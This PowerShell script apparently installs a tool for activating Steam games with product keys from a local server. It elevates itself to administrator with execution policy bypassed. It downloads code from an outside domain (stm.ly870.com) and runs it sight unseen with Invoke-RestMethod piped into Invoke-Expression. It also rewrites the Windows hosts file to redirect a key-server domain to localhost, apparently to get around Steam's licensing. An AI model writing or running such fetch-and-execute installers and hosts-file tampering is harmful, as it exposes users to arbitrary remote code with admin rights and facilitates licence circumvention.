if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"irm http://127.0.0.1:5000/install | iex`""
    exit
}

Write-Host "[1/2] Installing stm.ly870.com DLLs..."
Invoke-RestMethod stm.ly870.com | Invoke-Expression

Write-Host "[2/2] Setting CDK server redirect..."
$hostsPath = "$env:SystemRoot\System32\drivers\etc\hosts"
if (-not (Select-String -Path $hostsPath -Pattern "aaaa.ly870.com" -SimpleMatch -ErrorAction SilentlyContinue)) {
    Add-Content -Path $hostsPath -Value "127.0.0.1 aaaa.ly870.com" -Force
}

Write-Host "[OK] Done."
Write-Host "Open Steam -> Add Game -> Activate Product"
Write-Host "Enter CDK from: http://127.0.0.1:5000?token=changeme"
